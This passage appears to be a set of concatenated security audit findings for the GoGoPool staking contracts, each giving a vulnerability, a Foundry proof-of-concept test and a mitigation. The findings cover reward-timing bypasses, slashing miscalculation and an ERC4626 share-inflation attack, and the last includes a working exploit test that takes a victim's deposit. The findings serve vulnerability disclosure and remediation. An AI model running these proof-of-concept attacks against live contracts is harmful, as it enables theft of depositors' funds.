getAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner"))); 371:   uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt"))); 372:   Staking staking = Staking(getContractAddress("Staking")); 373:   if (staking.getAVAXAssignedHighWater(owner) < staking.getAVAXAssigned(owner)) { 374:    staking.increaseAVAXAssignedHighWater(owner, avaxLiquidStakerAmt);//@audit wrong 375:   } 376: 377:   emit MinipoolStatusChanged(nodeID, MinipoolStatus.Staking); 378:  } ```  In the line #373, if the current assigned AVAX is greater than the owner's `AVAXAssignedHighWater`, it is increased by `avaxLiquidStakerAmt`. But this is supposed to be updated to `staking.getAVAXAssigned(owner)` rather than being increased by the amount.  Example: The node operator creates a minipool with 1000AVAX via `createMinipool(nodeID, 2 weeks, delegationFee, 1000*1e18)`. On creation, the assigned AVAX for the operator will be 1000AVAX. If the Rialtor calls `recordStakingStart()`, `AVAXAssignedHighWater` will be updated to 1000AVAX. After the validation finishes, the operator creates another minipool with 1500AVAX this time. Then on `recordStakingStart()`, `AVAXAssignedHighWater` will be updated to 2500AVAX by increasing 1500AVAX because the current assigned AVAX is 1500AVAX which is higher than the current `AVAXAssignedHighWater=1000AVAX`. This is wrong because the actual highest assigned amount is 1500AVAX. Note that `AVAXAssignedHighWater` is reset only through the function `calculateAndDistributeRewards` which can be called after `RewardsCycleSeconds=28 days`.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Call `staking.resetAVAXAssignedHighWater(owner)` instead of calling `increaseAVAXAssignedHighWater()`.  ```solidity MinipoolManager.sol 373:   if (staking.getAVAXAssignedHighWater(owner) < staking.getAVAXAssigned(owner)) { 374:    staking.resetAVAXAssignedHighWater(owner); //@audit update to the current AVAX assigned 375:   } ```
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L41-L43   # Vulnerability details  ## Impact When more than 10 mulitsig, it is impossible to modify or delete the old ones, making it impossible to create new valid ones.  ## Proof of Concept  MultisigManager limits the number of Multisig to 10, which cannot be deleted or replaced after they have been disable This will have a problem, if the subsequent use of 10, all 10 for some reason, be disabled Then it is impossible to add new ones and replace the old ones, so you have to continue using the old Multisig at risk  ```solidity     function registerMultisig(address addr) external onlyGuardian {         int256 multisigIndex = getIndexOf(addr);         if (multisigIndex != -1) {             revert MultisigAlreadyRegistered();         }         uint256 index = getUint(keccak256("multisig.count"));         if (index >= MULTISIG_LIMIT) {             revert MultisigLimitReached(); //***@audit limt 10, and no other way to delete or replace the old Multisig ***//         } ```  ## Tools Used  ## Recommended Mitigation Steps  add replace old mulitsig method  ```solidity     function replaceMultisig(address addr,address oldAddr) external onlyGuardian {         int256 multisigIndex = getIndexOf(oldAddr);         if (multisigIndex == -1) {             revert MultisigNotFound();         }          setAddress(keccak256(abi.encodePacked("multisig.item", multisigIndex, ".address")), addr);         emit RegisteredMultisig(addr, msg.sender);     } ```
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L225-L227 https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L279-L281   # Vulnerability details  ## Impact  When canceling a minipool that was canceled before, it may skip MinipoolCancelMoratoriumSeconds checking and allow the user to cancel the minipool immediately.  ## Proof of Concept A user may create a minipool.  ``` /// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.  /// @param nodeID 20-byte Avalanche node ID  /// @param duration Requested validation period in seconds  /// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)  /// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool  function createMinipool(   address nodeID,   uint256 duration,   uint256 delegationFee,   uint256 avaxAssignmentRequest  ) external payable whenNotPaused {   if (nodeID == address(0)) {    revert InvalidNodeID();   }    ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));   if (    // Current rule is matched funds must be 1:1 nodeOp:LiqStaker    msg.value != avaxAssignmentRequest ||    avaxAssignmentRequest > dao.getMinipoolMaxAVAXAssignment() ||    avaxAssignmentRequest < dao.getMinipoolMinAVAXAssignment()   ) {    revert InvalidAVAXAssignmentRequest();   }    if (msg.value + avaxAssignmentRequest < dao.getMinipoolMinAVAXStakingAmt()) {    revert InsufficientAVAXForMinipoolCreation();   }    Staking staking = Staking(getContractAddress("Staking"));   staking.increaseMinipoolCount(msg.sender);   staking.increaseAVAXStake(msg.sender, msg.value);   staking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);    if (staking.getRewardsStartTime(msg.sender) == 0) {    staking.setRewardsStartTime(msg.sender, block.timestamp);   }    uint256 ratio = staking.getCollateralizationRatio(msg.sender);   if (ratio < dao.getMinCollateralizationRatio()) {    revert InsufficientGGPCollateralization();   }    // Get a Rialto multisig to assign for this minipool   MultisigManager multisigManager = MultisigManager(getContractAddress("MultisigManager"));   address multisig = multisigManager.requireNextActiveMultisig();    // Create or update a minipool record for nodeID   // If nodeID exists, only allow overwriting if node is finished or canceled   //   (completed its validation period and all rewards paid and processing is complete)   int256 minipoolIndex = getIndexOf(nodeID);   if (minipoolIndex != -1) {    onlyOwner(minipoolIndex);    requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);    resetMinipoolData(minipoolIndex);    // Also reset initialStartTime as we are starting a whole new validation    setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")), 0);    } else {    minipoolIndex = int256(getUint(keccak256("minipool.count")));    // The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()    setUint(keccak256(abi.encodePacked("minipool.index", nodeID)), uint256(minipoolIndex + 1));    setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".nodeID")), nodeID);    addUint(keccak256("minipool.count"), 1);   }    // Save the attrs individually in the k/v store   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".duration")), duration);   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".delegationFee")), delegationFee);    setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")), msg.sender);   setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".multisigAddr")), multisig);   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpInitialAmt")), msg.value);   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpAmt")), msg.value);   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt")), avaxAssignmentRequest);    emit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);    Vault vault = Vault(getContractAddress("Vault"));   vault.depositAVAX{value: msg.value}();  } ```  and after 5 days, the user cancels the minipool  ```  /// @notice Owner of a minipool can cancel the (prelaunch) minipool  /// @param nodeID 20-byte Avalanche node ID the Owner registered with  function cancelMinipool(address nodeID) external nonReentrant {   Staking staking = Staking(getContractAddress("Staking"));   ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));   int256 index = requireValidMinipool(nodeID);   onlyOwner(index);   // make sure they meet the wait period requirement   if (block.timestamp - staking.getRewardsStartTime(msg.sender) < dao.getMinipoolCancelMoratoriumSeconds()) {    revert CancellationTooEarly();   }   _cancelMinipoolAndReturnFunds(nodeID, index);  } ```  Then, the user recreates the minipool again by calling the same createMinipool function. Then, the user cancels the minipool immediately. The user should not be allowed to cancel the minpool immediately and he should wait for 5 more days.  Added a test unit to MinipoolManager.t.sol  ```  function testMinipoolManager() public {   address nodeID1 = randAddress();    vm.startPrank(nodeOp);   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(100 ether);    {    MinipoolManager.Minipool memory mp = createMyMinipool(nodeID1, 1000 ether, 1000 ether, 2 weeks);     skip(5 days);    minipoolMgr.cancelMinipool(mp.nodeID); // Must skip 5 days to be executed   }    {    MinipoolManager.Minipool memory mp = createMyMinipool(nodeID1, 1000 ether, 1000 ether, 2 weeks);    minipoolMgr.cancelMinipool(mp.nodeID); // Do not need 5 days more to be executed which is wrong   }    vm.stopPrank();  } ```  ## Tools Used Manual and added a test unit  ## Recommended Mitigation Steps Change the createMinipool function. Always setRewardsStartTime everytime the minippol is recreated.   ``` /// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.  /// @param nodeID 20-byte Avalanche node ID  /// @param duration Requested validation period in seconds  /// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)  /// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool  function createMinipool(   address nodeID,   uint256 duration,   uint256 delegationFee,   uint256 avaxAssignmentRequest  ) external payable whenNotPaused {   if (nodeID == address(0)) {    revert InvalidNodeID();   }    ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));   if (    // Current rule is matched funds must be 1:1 nodeOp:LiqStaker    msg.value != avaxAssignmentRequest ||    avaxAssignmentRequest > dao.getMinipoolMaxAVAXAssignment() ||    avaxAssignmentRequest < dao.getMinipoolMinAVAXAssignment()   ) {    revert InvalidAVAXAssignmentRequest();   }    if (msg.value + avaxAssignmentRequest < dao.getMinipoolMinAVAXStakingAmt()) {    revert InsufficientAVAXForMinipoolCreation();   }    Staking staking = Staking(getContractAddress("Staking"));   staking.increaseMinipoolCount(msg.sender);   staking.increaseAVAXStake(msg.sender, msg.value);   staking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);    --- if (staking.getRewardsStartTime(msg.sender) == 0) {    staking.setRewardsStartTime(msg.sender, block.timestamp);   --- }    uint256 ratio = staking.getCollateralizationRatio(msg.sender);   if (ratio < dao.getMinCollateralizationRatio()) {    revert InsufficientGGPCollateralization();   }    // Get a Rialto multisig to assign for this minipool   MultisigManager multisigManager = MultisigManager(getContractAddress("MultisigManager"));   address multisig = multisigManager.requireNextActiveMultisig();    // Create or update a minipool record for nodeID   // If nodeID exists, only allow overwriting if node is finished or canceled   //   (completed its validation period and all rewards paid and processing is complete)   int256 minipoolIndex = getIndexOf(nodeID);   if (minipoolIndex != -1) {    requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);    resetMinipoolData(minipoolIndex);    // Also reset initialStartTime as we are starting a whole new validation    setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")), 0);   } else {    minipoolIndex = int256(getUint(keccak256("minipool.count")));    // The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()    setUint(keccak256(abi.encodePacked("minipool.index", nodeID)), uint256(minipoolIndex + 1));    setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".nodeID")), nodeID);    addUint(keccak256("minipool.count"), 1);   }    // Save the attrs individually in the k/v store   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".duration")), duration);   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".delegationFee")), delegationFee);   setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")), msg.sender);   setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".multisigAddr")), multisig);   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpInitialAmt")), msg.value);   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpAmt")), msg.value);   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt")), avaxAssignmentRequest);    emit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);    Vault vault = Vault(getContractAddress("Vault"));   vault.depositAVAX{value: msg.value}();  } ```
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L673-L675   # Vulnerability details  ## Description A node operator sends in the amount of duration they want to stake for. Behind the scenes Rialto will stake in 14 day cycles and then distribute rewards.  If a node operator doesn't have high enough availability and doesn't get any rewards, the protocol will slash their staked `GGP`. For calculating the expected rewards that are missed however, the full duration is used:  ```javascript File: MinipoolManager.sol  557: function getExpectedAVAXRewardsAmt(uint256 duration, uint256 avaxAmt) public view returns (uint256) { 558:  ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO")); 559:  uint256 rate = dao.getExpectedAVAXRewardsRate(); 560:  return (avaxAmt.mulWadDown(rate) * duration) / 365 days; // full duration used when calculating expected reward 561: }  ...  670: function slash(int256 index) private {  ...  673:  uint256 duration = getUint(keccak256(abi.encodePacked("minipool.item", index, ".duration"))); 674:  uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt"))); 675:  uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt); // full duration 676:  uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt); ```  This is unfair to the node operator because the expected rewards is from a 14 day cycle.  Also, If they were to be unavailable again, in a later cycle, they would get slashed for the full duration once again.  ## Impact A node operator staking for a long time is getting slashed for an unfairly large amount if they aren't available during a 14 day period.  The protocol also wants node operators to stake in longer periods: https://multisiglabs.notion.site/Known-Issues-42e2f733daf24893a93ad31100f4cd98 > Team Comment:   > - This can only be taken advantage of when signing up for 2-4 week validation periods. **Our protocol is incentivizing nodes to sign up for 3-12 month validation periods.** If the team notices this mechanic being abused, Rialto may update its GGP reward calculation to disincentive this behavior.  This slashing amount calculation incentives the node operator to sign up for the shortest period possible and restake themselves to minimize possible losses.   ## Proof of Concept Test in `MinipoolManager.t.sol`:  ```javascript  function testRecordStakingEndWithSlashHighDuration() public {   uint256 duration = 365 days;   uint256 depositAmt = 1000 ether;   uint256 avaxAssignmentRequest = 1000 ether;   uint256 validationAmt = depositAmt + avaxAssignmentRequest;   uint128 ggpStakeAmt = 200 ether;    vm.startPrank(nodeOp);   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(ggpStakeAmt);   MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);   vm.stopPrank();    address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);   vm.prank(liqStaker1);   ggAVAX.depositAVAX{value: MAX_AMT}();    vm.prank(address(rialto));   minipoolMgr.claimAndInitiateStaking(mp1.nodeID);    bytes32 txID = keccak256("txid");   vm.prank(address(rialto));   minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);    skip(2 weeks); // a two week cycle      vm.prank(address(rialto));   minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether);    assertEq(vault.balanceOf("MinipoolManager"), depositAmt);    int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);   MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);   assertEq(mp1Updated.status, uint256(MinipoolStatus.Withdrawable));   assertEq(mp1Updated.avaxTotalRewardAmt, 0);   assertTrue(mp1Updated.endTime != 0);    assertEq(mp1Updated.avaxNodeOpRewardAmt, 0);   assertEq(mp1Updated.avaxLiquidStakerRewardAmt, 0);    assertEq(minipoolMgr.getTotalAVAXLiquidStakerAmt(), 0);    assertEq(staking.getAVAXAssigned(mp1Updated.owner), 0);   assertEq(staking.getMinipoolCount(mp1Updated.owner), 0);    // log slash amount   console.log("slashedAmount",mp1Updated.ggpSlashAmt);  } ```  Slashed amount for a `365 days` duration is `100 eth` (10%). However, where they to stake for the minimum time, `14 days` the slashed amount would be only ~`3.8 eth`.  ## Tools Used vs code, forge  ## Recommended Mitigation Steps Either hard code the duration to 14 days for calculating expected rewards or calculate the actual duration using `startTime` and `endTime`. 
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L215-L223 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L205-L213   # Vulnerability details  ## Impact Functions `maxWithdraw()` and `maxRedeem()` returns max amount of assets or shares owner would be able to withdraw taking into account liquidity in the TokenggAVAX contract, but logics don't consider that when user withdraws the withdrawal amounts subtracted from `totalReleasedAssets` (in `beforeWithdraw()` function) so the maximum amounts that can user withdraws should always be lower than `totalReleasedAssets` (which shows all the deposits and withdraws) but because functions `maxWithdraw()` and `maxRedeem()` uses `totalAssets()` to calculate available AVAX which includes deposits and current cycle rewards so those functions would return wrong value (whenever the return value is bigger than `totalReleaseAssets` then it would be wrong)  ## Proof of Concept This is `beforeWithdraw()` code: ```  function beforeWithdraw(   uint256 amount,   uint256 /* shares */  ) internal override {   totalReleasedAssets -= amount;  } ``` This is `beforeWithdraw()` code which is called whenever users withdraws their funds and as you can see the amount of withdrawal assets subtracted from `totalReleaseAssets` so withdrawal amounts can never be bigger than `totalReleaseAssets`. This is `maxWithdraw()` code: ```  function maxWithdraw(address _owner) public view override returns (uint256) {   if (getBool(keccak256(abi.encodePacked("contract.paused", "TokenggAVAX")))) {    return 0;   }   uint256 assets = convertToAssets(balanceOf[_owner]);   uint256 avail = totalAssets() - stakingTotalAssets;   return assets > avail ? avail : assets;  } ``` As you can see to calculate available AVAX in the contract address code uses `totalAssets() - stakingTotalAssets` and `totalAssets()` shows deposits + current cycle rewards so `totalAssets()` is bigger than `totalReleaseAssets` and the value of the `totalAssets() - stakingTotalAssets` can be bigger than `totalReleaseAssets` and if code returns `avail` as answer then the return value would be wrong. imagine this scenario: 1. `totalReleaseAssets` is `10000` AVAX. 2. `stakingTotalAssets` is `1000` AVAX. 3. current cycle rewards is `4000` AVAX and `block.timestamp` is currently in the middle of the cycle so current rewards is `2000` AVAX. 4. `totalAssets()` is `totalReleaseAssets + current rewards = 10000 + 2000 = 12000`.  5. contract balance is `10000 + 4000 - 1000 = 13000` AVAX. 6. user1 has 90% contract shares and calls `maxWithdraw()` and code would calculate user assets as `10800` AVAX and available AVAX in contract as `totalAssets() - stakingTotalAssets = 12000 - 1000 = 11000` and code would return `10800` as answer. 7. now if user1 withdraws `10800` AVAX code would revert in the function `beforeWithdraw()` because code would try to execute `totalReleaseAssets = totalReleaseAssets - amount = 10000 - 10800` and it would revert because of the underflow. so in reality user1 couldn't withdraw `10800` AVAX which was the return value of the `maxWithdraw()` for user1.  the root cause of the bug is that the withdrawal amount is subtracted from `totalReleaseAssets` and so max withdrawal can never be `totalReleaseAssets` and function `maxWithdraw()` should never return value bigger than `totalReleaseAssets`. (the bug in function `maxRedeem()` is similar)  This bug would cause other contract or front end calls to fail, for example if the logic is something like this: ```    amount = maxWithdraw(user);    TokenggAVAX.withdrawAVAX(amount); ``` according the function definitions this code should work bug because of the the issue there are situations that this would revert and other contracts and UI can't work properly with the protocol.  ## Tools Used VIM  ## Recommended Mitigation Steps consider `totalReleaseAssets` in max withdrawal amount too.
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51   # Vulnerability details  ## Impact The `MinipoolManager.recordStakingError` function ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515)) does not decrease the `minipoolCount` of the staker.    This means that if a staker has a minipool that encounters an error, his `minipoolCount` can never go to zero again.    This is bad because the `minipoolCount` is used in `ClaimNodeOp.calculateAndDistributeRewards` to determine if the `rewardsStartTime` of the staker should be reset ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84)).    Since the `minipoolCount` cannot go to zero, the `rewardsStartTime` will never be reset.    This means that the staker is immediately eligible for rewards when he creates a minipool again whereas he should have to wait `rewardsEligibilityMinSeconds` before he is eligible (which is 14 days at the moment) ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51)).    To conclude, failing to decrease the `minipoolCount` allows the staker to earn higher rewards because he is eligible for staking right after he creates a new minipool and does not have to wait again.    ## Proof of Concept I have created the following test that you can add to the `MinipoolManager.t.sol` file that logs the `minipoolCount` in the `Staking`, `Error` and `Finished` state.    The `minipoolCount` is always `1` although it should decrease to `0` when `recordStakingError` is called.    ```solidity function testRecordStakingErrorWrongMinipoolCount() public {     uint256 duration = 2 weeks;     uint256 depositAmt = 1000 ether;     uint256 avaxAssignmentRequest = 1000 ether;     uint256 validationAmt = depositAmt + avaxAssignmentRequest;     uint128 ggpStakeAmt = 200 ether;      vm.startPrank(nodeOp);     ggp.approve(address(staking), MAX_AMT);     staking.stakeGGP(ggpStakeAmt);     MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);     vm.stopPrank();      address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);     vm.prank(liqStaker1);     ggAVAX.depositAVAX{value: MAX_AMT}();      vm.prank(address(rialto));     minipoolMgr.claimAndInitiateStaking(mp1.nodeID);      bytes32 txID = keccak256("txid");     vm.prank(address(rialto));     minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);      bytes32 errorCode = "INVALID_NODEID";      int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);      vm.prank(nodeOp);     // minipool count when in "Staking" state: 1     console.log(staking.getMinipoolCount(nodeOp));     vm.prank(address(rialto));     minipoolMgr.recordStakingError{value: validationAmt}(mp1.nodeID, errorCode);     vm.prank(nodeOp);     // minipool count when in "Error" state: 1     console.log(staking.getMinipoolCount(nodeOp));      vm.prank(address(rialto));      assertEq(vault.balanceOf("MinipoolManager"), depositAmt);      MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);      vm.prank(address(rialto));     minipoolMgr.finishFailedMinipoolByMultisig(mp1Updated.nodeID);     MinipoolManager.Minipool memory mp1finished = minipoolMgr.getMinipool(minipoolIndex);     vm.prank(nodeOp);     // minipool count when in "Finished" state: 1     console.log(staking.getMinipoolCount(nodeOp)); } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps You need to simply add the line `staking.decreaseMinipoolCount(owner);` to the `MinipoolManager.recordStakingError` function.  
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123   # Vulnerability details  ## Impact  Inflation of `ggAVAX` share price can be done by depositing as soon as the vault is created.  Impact: 1. Early depositor will be able steal other depositors funds 2. Exchange rate is inflated. As a result depositors are not able to deposit small funds.  ## Proof of Concept  If `ggAVAX` is not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share.  The depositor can donate WAVAX to the vault and call `syncRewards`. This will start inflating the price.  When the attacker front-runs the creation of the vault, the attacker:  1. Calls `depositAVAX` to receive 1 share 2. Transfers `WAVAX` to `ggAVAX` 3. Calls `syncRewards` to inflate exchange rate  The issue exists because the exchange rate is calculated as the ratio between the `totalSupply` of shares and the `totalAssets()`. When the attacker transfers `WAVAX` and calls `syncRewards()`, the `totalAssets()` increases gradually and therefore the exchange rate also increases.  `convertToShares `: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123 ```  function convertToShares(uint256 assets) public view virtual returns (uint256) {   uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());  } ```  Its important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days. This is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).  `syncRewards`: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102 ```  function syncRewards() public { ----------   // Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.   uint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength; ---------  } ```  Therefore: - The closer the call to `syncRewards` is to the next evenly divisible value of `rewardsCycleLength`, the closer the next  `rewardsCycleEnd` will be.  - The closer the delta between `syncRewards` calls is, the higher revenue the attacker will get.  Edge case example:  `syncRewards` is called with the timestamp 1672876799, `syncRewards` will be able to be called again 1 second later. `(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800`  Additionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.  `depositAVAX`: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166 ```  function depositAVAX() public payable returns (uint256 shares) { ------   if ((shares = previewDeposit(assets)) == 0) {    revert ZeroShares();   } ------  } ```  `previewDeposit` and `convertToShares `: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123 ```  function convertToShares(uint256 assets) public view virtual returns (uint256) {   uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());  }  function previewDeposit(uint256 assets) public view virtual returns (uint256) {   return convertToShares(assets);  } ```  ### Foundry POC  The POC will demonstrate the below scenario: 1. Bob front-runs the vault creation. 2. Bob deposits 1 WEI of AVAX to the vault. 3. Bob transfers 1000 WAVAX to the vault. 4. Bob calls `syncRewards` when block.timestamp = `1672876799`. 5. Bob waits 1 second. 6. Bob calls `syncRewards` again. Share price fully inflated. 7. Alice deposits 2000 AVAX to vault. 8. Bob withdraws 1500 AVAX (steals 500 AVAX from Alice). 9. Alice share earns her 1500 AVAX (although she deposited 2000).  Additionally, the POC will show that depositors trying to deposit less then the donation amount will revert.   Add the following test to `TokenggAVAX.t.sol`: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108 ```  function testShareInflation() public {   uint256 depositAmount = 1;   uint256 aliceDeposit = 2000 ether;   uint256 donationAmount = 1000 ether;   vm.deal(bob, donationAmount  + depositAmount);   vm.deal(alice, aliceDeposit);   vm.warp(1672876799);    // create new ggAVAX   ggAVAXImpl = new TokenggAVAX();   ggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));   ggAVAX.initialize(store, ERC20(address(wavax)));    // Bob deposits 1 WEI of AVAX   vm.prank(bob);   ggAVAX.depositAVAX{value: depositAmount}();   // Bob transfers 1000 AVAX to vault   vm.startPrank(bob);   wavax.deposit{value: donationAmount}();   wavax.transfer(address(ggAVAX), donationAmount);   vm.stopPrank();   // Bob Syncs rewards   ggAVAX.syncRewards();    // 1 second has passed   // This can range between 0-14 days. Every seconds, exchange rate rises   skip(1 seconds);    // Alice deposits 2000 AVAX   vm.prank(alice);   ggAVAX.depositAVAX{value: aliceDeposit}();    //Expectet revert when any depositor deposits less then 1000 AVAX   vm.expectRevert(bytes4(keccak256("ZeroShares()")));   ggAVAX.depositAVAX{value: 10 ether}();    // Bob withdraws maximum assests for his share   uint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);   vm.prank(bob);   ggAVAX.withdrawAVAX(maxWithdrawAssets);    //Validate bob has withdrawn 1500 AVAX    assertEq(bob.balance, 1500 ether);    // Alice withdraws maximum assests for her share   maxWithdrawAssets = ggAVAX.maxWithdraw(alice);   ggAVAX.syncRewards(); // to update accounting   vm.prank(alice);   ggAVAX.withdrawAVAX(maxWithdrawAssets);    // Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)   assertEq(alice.balance, 1500 ether + 1);  } ```  To run the POC, execute: ``` forge test -m testShareInflation -v ```  Expected output: ``` Running 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest [PASS] testShareInflation() (gas: 3874399) Test result: ok. 1 passed; 0 failed; finished in 8.71s ```  ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  When creating the vault add initial funds in order to make it harder to inflate the price.  Best practice would add initial funds as part of the initialization of the contract (to prevent front-running).
